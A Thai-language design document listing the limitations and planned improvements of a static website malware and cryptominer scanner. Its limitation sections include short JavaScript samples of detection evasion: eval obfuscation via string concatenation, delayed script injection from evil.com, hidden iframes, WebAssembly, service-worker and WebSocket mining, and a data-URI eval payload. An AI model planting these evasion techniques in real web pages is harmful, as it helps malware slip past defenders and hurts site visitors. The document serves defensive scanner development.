# Limitations & Future Work - รายละเอียดเชิงลึก

---

## Limitations - ข้อจำกัดปัจจุบัน

### 1. Signature-Based Detection (ตรวจจับได้เฉพาะสิ่งที่รู้จัก)

#### ปัญหา
ระบบใช้ **Pattern Matching** (Regex) ในการตรวจจับ → ตรวจจับได้เฉพาะ patterns ที่เรารู้จักและเพิ่มเข้าไปใน code เท่านั้น

#### ตัวอย่างที่หลุดรอด
```javascript
// Mining script ใหม่ที่ยังไม่รู้จัก
var x = new SuperNewMiner('key');
x.beginMining();  // ไม่ตรวจจับเพราะไม่อยู่ใน patterns list

// Obfuscation แบบใหม่
var encoded = btoa("malicious code");
window["ev" + "al"](atob(encoded));  // หลบ detection เพราะใช้ string concatenation
```

#### ผลกระทบ
- **Zero-day threats** - malware ใหม่ที่ยังไม่เคยเห็นจะหลุดรอด
- **Custom obfuscation** - hacker สร้างวิธี obfuscate ใหม่ → ตรวจจับไม่ได้
- **ต้อง update manual** - ต้องเพิ่ม patterns เองตลอดเวลา

#### วิธีแก้
- เพิ่ม **Machine Learning** model ที่เรียนรู้ patterns ใหม่ได้เอง
- ใช้ **Threat Intelligence Feeds** ที่ update อัตโนมัติ

---

### 2. No Behavioral Analysis (ไม่เห็นโค้ดที่รันทีหลัง)

#### ปัญหา
ระบบอ่านแค่ **Source Code** (Static Analysis) → ไม่เห็นสิ่งที่เกิดขึ้นตอนรันจริง

#### ตัวอย่างที่หลุดรอด
```javascript
// 1. Delayed loading - รอค่อยโหลด malware
setTimeout(function() {
    var s = document.createElement("script");
    s.src = "https://evil.com/malware.js";
    document.body.appendChild(s);
}, 10000);  // รอ 10 วินาที → static analysis ไม่เห็น

// 2. Dynamic string building - สร้าง string แบบ dynamic
var a = "ev";
var b = "il.";
var c = "com";
var url = "https://" + a + b + c + "/payload";
// = "https://evil.com/payload" → static analysis อ่านไม่ออกว่าเป็น malicious URL

// 3. Conditional loading - โหลดเฉพาะเงื่อนไข
if (navigator.userAgent.includes("Chrome")) {
    loadMalware();  // โหลดเฉพาะ Chrome → ยากต่อการตรวจจับ
}

// 4. Event-based loading - โหลดเมื่อ user ทำอะไร
document.addEventListener("click", function() {
    loadMalware();  // โหลดเมื่อ user คลิก → static ไม่เห็น
});
```

#### ผลกระทบ
- **Dynamic malware** - malware ที่โหลดมาทีหลังหลุดรอด
- **Conditional attacks** - โจมตีเฉพาะบาง browser/device
- **User interaction required** - ต้องรอ user คลิกค่อยทำงาน

#### วิธีแก้
- ใช้ **Headless Browser** (Playwright/Puppeteer) รันโค้ดจริงแล้ว monitor
- ใช้ **Sandbox** environment ในการรันและสังเกต behavior

---

### 3. False Positives (แจ้งเตือนผิด)

#### ปัญหา
ระบบแจ้งเตือนสิ่งที่ **ปลอดภัย** ว่าอันตราย

#### ตัวอย่าง False Positives
```html
<!-- 1. Google Tag Manager - ปลอดภัย แต่ถูกตรวจจับ -->
<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXXX" 
        style="display:none;visibility:hidden" width="0" height="0"></iframe>
→ ตรวจจับเป็น: Hidden iframe (25 points)

<!-- 2. YouTube embed - ปลอดภัย แต่ถูกตรวจจับ -->
<iframe src="https://www.youtube.com/embed/VIDEO_ID"></iframe>
→ ตรวจจับเป็น: External domain iframe (15 points)

<!-- 3. Google Analytics - ปลอดภัย แต่ถูกตรวจจับ -->
<script src="https://www.google-analytics.com/analytics.js"></script>
→ ตรวจจับเป็น: External script (10 points)

<!-- 4. Facebook SDK - ปลอดภัย แต่ถูกตรวจจับ -->
<script src="https://connect.facebook.net/en_US/sdk.js"></script>
→ ตรวจจับเป็น: External script (10 points)

<!-- 5. GitHub links - ปลอดภัย แต่ถูกตรวจจับ -->
<a href="https://github.com/user/repo">GitHub</a>
→ ตรวจจับเป็น: .git pattern (15 points) - แก้แล้ว
```

#### ผลกระทบ
- **ผู้ใช้สับสน** - เว็บปลอดภัยแต่ถูกแจ้งเตือน
- **Alert fatigue** - แจ้งเตือนเยอะเกินไป → ผู้ใช้ไม่สนใจ
- **ลดความน่าเชื่อถือ** - ระบบดูไม่แม่นยำ

#### วิธีแก้
- เพิ่ม **Whitelist** สำหรับ known safe domains (Google, Facebook, YouTube, etc.)
- ตรวจสอบว่า iframe อยู่ใน `<noscript>` tag ไหม (GTM fallback)
- ใช้ **Exact matching** แทน substring matching

---

### 4. No Real Browser Rendering (ไม่ดึงข้อมูลแบบ Real Browser)

#### ปัญหา
ระบบใช้ `requests.get()` ดึงแค่ **HTML text** → ไม่รัน JavaScript → ไม่เห็น DOM หลัง render

#### เปรียบเทียบ
| | ระบบเรา (Static) | Real Browser |
|---|------------------|--------------|
| ดึง HTML | ✅ ได้ | ✅ ได้ |
| รัน JavaScript | ❌ ไม่รัน | ✅ รันทั้งหมด |
| เห็น DOM หลัง render | ❌ ไม่เห็น | ✅ เห็น |
| เห็น dynamic content | ❌ ไม่เห็น | ✅ เห็น |
| เห็น network requests | ❌ ไม่เห็น | ✅ เห็น |
| เห็น WebAssembly | ❌ ไม่เห็น | ✅ เห็น |

#### ตัวอย่างที่หลุดรอด
```javascript
// 1. Dynamic iframe creation - สร้าง iframe แบบ dynamic
document.write('<iframe src="https://evil.com" style="display:none"></iframe>');
→ Static analysis: ไม่เห็น iframe นี้
→ Real browser: เห็น iframe หลัง render

// 2. WebAssembly mining - ใช้ WebAssembly ขุดเงิน
WebAssembly.instantiateStreaming(fetch("miner.wasm"))
    .then(obj => obj.exports.start());
→ Static analysis: ไม่เห็น (ไม่ใช่ JavaScript pattern)
→ Real browser: เห็น network request ไป miner.wasm

// 3. Service Worker mining - ใช้ Service Worker ขุดเงิน
navigator.serviceWorker.register("sw-miner.js");
→ Static analysis: อาจไม่เห็นถ้าโหลดแบบ dynamic
→ Real browser: เห็น service worker ถูก register

// 4. Canvas fingerprinting - ลายนิ้วมือ browser
var canvas = document.createElement("canvas");
var ctx = canvas.getContext("2d");
var fingerprint = canvas.toDataURL();
→ Static analysis: อาจไม่ตรวจจับ
→ Real browser: เห็น canvas ถูกสร้างและ export
```

#### ผลกระทบ
- **Dynamic content** - เนื้อหาที่สร้างโดย JavaScript หลุดรอด
- **WebAssembly attacks** - malware ที่ใช้ WebAssembly หลุดรอด
- **Service Worker attacks** - background mining หลุดรอด

#### วิธีแก้
- ใช้ **Headless Browser** (Playwright/Puppeteer) แทน requests
- Monitor **Network requests** ทั้งหมด
- ตรวจสอบ **WebAssembly** modules

---

### 5. Limited Protocol Support (ไม่รองรับ protocols อื่น)

#### ปัญหา
ระบบตรวจสอบเฉพาะ **HTTP/HTTPS** → ไม่ตรวจสอบ protocols อื่น

#### Protocols ที่ไม่ตรวจสอบ
| Protocol | ตัวอย่าง | ความเสี่ยง |
|----------|---------|-----------|
| WebSocket | `ws://evil.com/miner` | Real-time mining |
| WebRTC | `RTCPeerConnection` | IP leak, P2P mining |
| WebTransport | `new WebTransport(...)` | P2P connections |
| Data URI | `data:text/html,<script>...` | Inline malicious code |

#### ตัวอย่างที่หลุดรอด
```javascript
// WebSocket mining - เชื่อมต่อ mining pool แบบ real-time
var ws = new WebSocket("wss://mining-pool.com/ws");
ws.onmessage = function(event) {
    // รับคำสั่งขุดเงิน
    startMining(JSON.parse(event.data));
};

// WebRTC P2P mining - ใช้เครื่องอื่นขุดเงิน
var pc = new RTCPeerConnection();
pc.createDataChannel("mining");

// Data URI - ซ่อน malicious code ใน data URI
var script = document.createElement("script");
script.src = "data:text/javascript,eval(atob('bWFsd2FyZQ=='))";
document.body.appendChild(script);
```

#### ผลกระทบ
- **WebSocket mining** - mining แบบ real-time หลุดรอด
- **P2P attacks** - ใช้ WebRTC สร้างเครือข่าย mining
- **Data URI attacks** - ซ่อน malicious code ใน data URI

#### วิธีแก้
- ตรวจสอบ **WebSocket** connections
- ตรวจสอบ **WebRTC** usage
- ตรวจสอบ **Data URI** ใน script src

---

### 6. No Rate Limiting (ไม่มีจำกัดการใช้งาน)

#### ปัญหา
API ไม่มี rate limiting → ใครก็เรียกใช้กี่ครั้งก็ได้

#### ผลกระทบ
- **Abuse** - คนไม่หวังดีเรียกใช้เยอะๆ → server ล่ม
- **Resource exhaustion** - ใช้ CPU/memory เยอะเกินไป
- **DoS** - Denial of Service

#### วิธีแก้
- เพิ่ม **Rate limiting** (เช่น 10 requests/นาที ต่อ IP)
- เพิ่ม **API key authentication**
- ใช้ **Caching** สำหรับ URL ที่ scan แล้ว

---

### 7. No User Authentication (ไม่มีระบบผู้ใช้)

#### ปัญหา
ทุกคนใช้ได้เลย → ไม่มีประวัติส่วนตัว

#### ผลกระทบ
- **No personalization** - ไม่มีประวัติส่วนตัว
- **No access control** - ทุกคนเห็นข้อมูลเดียวกัน
- **No audit trail** - ไม่รู้ว่าใคร scan อะไร

#### วิธีแก้
- เพิ่ม **User registration/login**
- เพิ่ม **Personal scan history**
- เพิ่ม **Role-based access control**

---

## Future Work - สิ่งที่อยากทำเพิ่ม

### 1. Google Safe Browsing API Integration

#### ทำอะไร
เชื่อมต่อระบบกับ **Google Safe Browsing API** เพื่อตรวจสอบ URLs กับ database ของ Google

#### วิธีทำงาน
```
User กรอก URL → ตรวจสอบกับ Google Safe Browsing → ได้ผลลัพธ์
                                        ↓
                              Malicious? → เพิ่มคะแนนความเสี่ยง
                              Safe? → ลดคะแนนความเสี่ยง
```

#### ประโยชน์
- ตรวจจับ **phishing/malware domains** ได้ดีขึ้น
- ได้ **real-time updates** จาก Google
- ลด **false positives** (Google บอกว่าปลอดภัย → เราเชื่อ)

#### วิธีทำ
```python
import requests

def check_safe_browsing(url):
    api_key = "YOUR_API_KEY"
    endpoint = f"https://safebrowsing.googleapis.com/v4/threatMatches:find?key={api_key}"
    
    payload = {
        "threatInfo": {
            "threatTypes": ["MALWARE", "SOCIAL_ENGINEERING", "UNWANTED_SOFTWARE", "POTENTIALLY_HARMFUL_APPLICATION"],
            "platformTypes": ["ANY_PLATFORM"],
            "threatEntryTypes": ["URL"],
            "threatEntries": [{"url": url}]
        }
    }
    
    response = requests.post(endpoint, json=payload)
    result = response.json()
    
    if "matches" in result:
        return True, result["matches"]  # Malicious
    return False, None  # Safe
```

#### ความยาก
- ง่าย (ใช้ API ที่มีอยู่แล้ว)
- ต้องขอ API key จาก Google

---

### 2. Machine Learning-Based Detection

#### ทำอะไร
ฝึก **Machine Learning model** เพื่อ classify malicious vs benign scripts

#### Features ที่ใช้
| Feature | คำอธิบาย | ตัวอย่าง |
|---------|----------|----------|
| String entropy | ความสุ่มของ string | High entropy = obfuscated |
| Function call count | จำนวน function calls | เยอะ = suspicious |
| DOM manipulation count | จำนวน DOM operations | เยอะ = suspicious |
| Network request count | จำนวน network requests | เยอะ = suspicious |
| Script length | ความยาวของ script | ยาวมาก = suspicious |
| Eval usage | มี eval() ไหม | มี = suspicious |
| Encoding ratio | สัดส่วน encoded strings | สูง = suspicious |

#### วิธีทำ
```python
from sklearn.ensemble import RandomForestClassifier
import numpy as np

# Features: [entropy, func_calls, dom_ops, net_requests, length, has_eval, encoding_ratio]
X_train = [
    [3.2, 5, 10, 2, 500, 0, 0.1],   # Benign
    [7.8, 50, 100, 20, 5000, 1, 0.8],  # Malicious
    # ... more samples
]
y_train = [0, 1]  # 0 = benign, 1 = malicious

model = RandomForestClassifier(n_estimators=100)
model.fit(X_train, y_train)

# Predict new script
features = extract_features(script)
prediction = model.predict([features])
probability = model.predict_proba([features])

if prediction[0] == 1:
    print(f"Malicious! Confidence: {probability[0][1]*100:.1f}%")
```

#### ประโยชน์
- ตรวจจับ **zero-day threats** ได้
- เรียนรู้ **patterns ใหม่** ได้เอง
- ลด **manual updates**

#### ความยาก
- ปานกลาง-ยาก
- ต้องมี dataset สำหรับ train
- ต้อง tune model ให้แม่นยำ

---

### 3. Headless Browser Integration (Playwright/Puppeteer)

#### ทำอะไร
ใช้ **Headless Browser** รันเว็บจริงแล้ว monitor behavior

#### วิธีทำงาน
```
User กรอก URL → เปิดใน Headless Browser → รัน JavaScript → Monitor behavior
                                              ↓
                                    เห็น DOM หลัง render
                                    เห็น network requests
                                    เห็น dynamic content
```

#### วิธีทำ
```python
from playwright.sync_api import sync_playwright

def analyze_with_browser(url):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        
        # เปิดหน้าเว็บ (รัน JS ทั้งหมด)
        page.goto(url, wait_until="networkidle", timeout=30000)
        
        # ได้ HTML หลัง render แล้ว
        html = page.content()
        
        # ดู network requests ทั้งหมด
        requests = []
        page.on("response", lambda response: requests.append({
            "url": response.url,
            "status": response.status
        }))
        
        # ดู console logs
        console_logs = []
        page.on("console", lambda msg: console_logs.append(msg.text))
        
        # ตรวจสอบ WebAssembly
        has_wasm = page.evaluate("""() => {
            return typeof WebAssembly !== 'undefined';
        }""")
        
        browser.close()
        
        return {
            "html": html,
            "requests": requests,
            "console_logs": console_logs,
            "has_wasm": has_wasm
        }
```

#### ประโยชน์
- เห็น **DOM หลัง render** แล้ว
- เห็น **network requests** ทั้งหมด
- ตรวจจับ **dynamic malware** ได้
- เห็น **WebAssembly** usage

#### ความยาก
- ปานกลาง
- ต้องติดตั้ง browser
- ช้ากว่า static analysis

---

### 4. Browser Extension

#### ทำอะไร
สร้าง **Extension** สำหรับ Chrome/Firefox ที่ตรวจสอบทุกหน้าที่ผู้ใช้เข้าแบบ real-time

#### Features
- ตรวจสอบ **ทุกหน้า** ที่ผู้ใช้เข้า
- แสดง **risk badge** บน address bar
- **Block** malicious sites อัตโนมัติ
- **Sync history** กับ main app

#### วิธีทำ
```javascript
// manifest.json
{
  "manifest_version": 3,
  "name": "WebGuard Extension",
  "version": "1.0",
  "permissions": ["webRequest", "activeTab", "storage"],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_popup": "popup.html"
  }
}

// background.js
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    // ตรวจสอบ URL กับ API
    checkUrl(details.url).then(result => {
      if (result.risk_level === "CRITICAL") {
        // Block page
        chrome.tabs.update(details.tabId, {url: "blocked.html"});
      }
    });
  },
  {urls: ["<all_urls>"]}
);
```

#### ประโยชน์
- ป้องกันผู้ใช้ **แบบ real-time**
- ไม่ต้อง copy URL มา scan
- **Seamless** experience

#### ความยาก
- ยาก
- ต้องเรียนรู้ browser extension API
- ต้อง submit ให้ Chrome/Firefox approve

---

### 5. Community Blocklist

#### ทำอะไร
ระบบให้ผู้ใช้ **รายงาน** เว็บอันตรายได้ → blocklist update จากชุมชน

#### วิธีทำงาน
```
User รายงานเว็บ → Admin ตรวจสอบ → เพิ่มเข้า blocklist → ทุกคนได้ประโยชน์
```

#### Features
- **Report button** บนหน้าผลลัพธ์
- **Voting system** สำหรับ verify reports
- **Auto-update** blocklist ทุกวัน
- **Dashboard** สำหรับ admin

#### ประโยชน์
- ได้ข้อมูล **ใหม่ๆ เร็วขึ้น**
- ช่วยกัน **ป้องกัน**
- **Crowdsourced** intelligence

#### ความยาก
- ปานกลาง
- ต้องมีระบบ user management
- ต้องมี admin dashboard

---

### 6. Screenshot Capture & Visual Analysis

#### ทำอะไร
จับ **screenshot** ของหน้าที่ scan แล้ววิเคราะห์ด้วย image recognition

#### วิธีทำงาน
```
User กรอก URL → จับ screenshot → วิเคราะห์ด้วย AI → ตรวจจับ phishing pages
```

#### ตรวจจับอะไร
- **Fake login forms** - หน้า login ปลอม
- **Brand impersonation** - เลียนแบบแบรนด์ดัง
- **Visual similarity** - หน้าตาเหมือนเว็บจริง

#### วิธีทำ
```python
from playwright.sync_api import sync_playwright
import tensorflow as tf

def capture_and_analyze(url):
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        page.goto(url)
        
        # จับ screenshot
        screenshot = page.screenshot()
        
        # วิเคราะห์ด้วย AI
        model = tf.keras.models.load_model("phishing_detector.h5")
        prediction = model.predict(preprocess_image(screenshot))
        
        browser.close()
        return prediction
```

#### ประโยชน์
- ตรวจจับ **visual phishing** ได้
- เห็น **หน้าตาจริง** ของเว็บ
- ตรวจจับ **brand impersonation** ได้

#### ความยาก
- ยาก
- ต้องมี AI model สำหรับ image recognition
- ต้องมี dataset สำหรับ train

---

### 7. API Rate Limiting & Authentication

#### ทำอะไร
เพิ่ม **rate limiting** และ **API key authentication**

#### วิธีทำ
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["10 per minute"]
)

@app.route("/analyze", methods=["POST"])
@limiter.limit("5 per minute")
def analyze():
    # ตรวจสอบ API key
    api_key = request.headers.get("X-API-Key")
    if not verify_api_key(api_key):
        return jsonify({"error": "Invalid API key"}), 401
    
    # วิเคราะห์ URL
    ...
```

#### ประโยชน์
- ป้องกัน **abuse**
- ควบคุม **resource usage**
- มี **audit trail**

#### ความยาก
- ง่าย

---

### 8. Docker Containerization

#### ทำอะไร
สร้าง **Docker image** สำหรับ deploy ง่าย

#### วิธีทำ
```dockerfile
FROM python:3.11-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt

COPY . .

EXPOSE 5000

CMD ["python", "app.py"]
```

```bash
# Build
docker build -t webguard .

# Run
docker run -p 5000:5000 webguard
```

#### ประโยชน์
- **Deploy ง่าย** บน server ใดๆ
- **Scale ได้ง่าย**
- **Consistent** environment

#### ความยาก
- ง่าย-ปานกลาง

---

## สรุป

### ข้อจำกัดหลัก
| ข้อจำกัด | ผลกระทบ | วิธีแก้ |
|----------|---------|---------|
| Signature-based | ตรวจจับ zero-day ไม่ได้ | Machine Learning |
| No behavioral analysis | ไม่เห็น dynamic malware | Headless Browser |
| False positives | แจ้งเตือนผิด | Whitelist + Safe Browsing |
| No real browser | ไม่เห็น DOM หลัง render | Playwright/Puppeteer |
| Limited protocols | ไม่เห็น WebSocket/WebAssembly | เพิ่ม protocol support |
| No rate limiting | Abuse ได้ | Rate limiting + API key |
| No authentication | ไม่มีประวัติส่วนตัว | User system |

### Future Work ลำดับความสำคัญ
| ลำดับ | ฟีเจอร์ | ความยาก | ประโยชน์ |
|-------|---------|---------|----------|
| 1 | Google Safe Browsing | ง่าย | สูง |
| 2 | Whitelist for safe domains | ง่าย | สูง |
| 3 | Rate limiting | ง่าย | ปานกลาง |
| 4 | Headless Browser | ปานกลาง | สูง |
| 5 | Docker | ง่าย | ปานกลาง |
| 6 | Community blocklist | ปานกลาง | ปานกลาง |
| 7 | Machine Learning | ยาก | สูง |
| 8 | Browser Extension | ยาก | สูง |
| 9 | Screenshot analysis | ยาก | ปานกลาง |